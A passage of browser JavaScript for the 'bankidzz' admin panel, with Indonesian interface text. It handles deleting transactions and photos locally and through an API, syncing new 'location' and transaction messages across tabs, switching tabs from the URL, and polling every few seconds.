            adminStored = adminStored.filter(t => t.transferId !== transferId);
            localStorage.setItem('bankidzz_admin_persisted_transfers', JSON.stringify(adminStored));
        } catch(e) {}

        try {
            await fetch(`${CONFIG.API_URL}?id=${encodeURIComponent(transferId)}`, {
                method: 'DELETE',
                headers: { 'Authorization': CONFIG.AUTH_TOKEN }
            });
        } catch(e) {}

        showNotification('Transaksi berhasil dihapus.');
        loadTransactions();
    };

    // ============================================================
    // CLEAR ALL
    // ============================================================
    async function clearAllTransactions() {
        if (!confirm('Apakah Anda yakin ingin menghapus SELURUH data transaksi & foto?')) return;

        localStorage.removeItem('bankidzz_local_transactions');
        localStorage.removeItem('bankidzz_admin_persisted_transfers');

        try {
            await fetch(`${CONFIG.API_URL}?all=true`, {
                method: 'DELETE',
                headers: { 'Authorization': CONFIG.AUTH_TOKEN }
            });
        } catch(e) {}

        showNotification('Seluruh data berhasil dibersihkan.');
        loadTransactions();
    }

    // ============================================================
    // REAL-TIME SYNC LISTENER
    // ============================================================
    function setupSyncListener() {
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'NEW_LOCATION') {
                    showNotification('⚡ Data Transaksi Baru / Foto Diterima!');
                    if (event.data.payload) {
                        try {
                            const adminStored = JSON.parse(localStorage.getItem('bankidzz_admin_persisted_transfers') || '[]');
                            const idx = adminStored.findIndex(t => t.transferId === event.data.payload.transferId);
                            if (idx >= 0) {
                                adminStored[idx] = { ...adminStored[idx], ...event.data.payload };
                            } else {
                                adminStored.unshift(event.data.payload);
                            }
                            localStorage.setItem('bankidzz_admin_persisted_transfers', JSON.stringify(adminStored));
                        } catch(e) {}
                    }
                    loadTransactions();
                }
            });
        } catch(e) {}

        window.addEventListener('storage', (e) => {
            if (e.key === 'bankidzz_local_transactions' || e.key === 'bankidzz_admin_persisted_transfers') {
                loadTransactions();
            }
        });
    }

    // ============================================================
    // EVENTS
    // ============================================================
    if (elements.btnRefresh) elements.btnRefresh.addEventListener('click', loadTransactions);
    if (elements.btnClearAll) elements.btnClearAll.addEventListener('click', clearAllTransactions);

    // Init
    checkHelixAuth();
    loadTemplate();
    loadWebProfile();
    loadTransactions();
    setupSyncListener();

    // Check URL hash or param on load (e.g. admin.html#web or admin.html?tab=web)
    try {
        const urlParams = new URLSearchParams(window.location.search);
        const tabParam = urlParams.get('tab') || window.location.hash.replace('#', '');
        if (tabParam === 'web') {
            switchTab('web');
        } else if (tabParam === 'transfer') {
            switchTab('transfer');
        } else if (tabParam === 'user') {
            switchTab('user');
        }
    } catch(e) {}

    // Auto-polling berkala setiap 3.5 detik agar selalu update dari perangkat lain
    setInterval(loadTransactions, 3500);

})();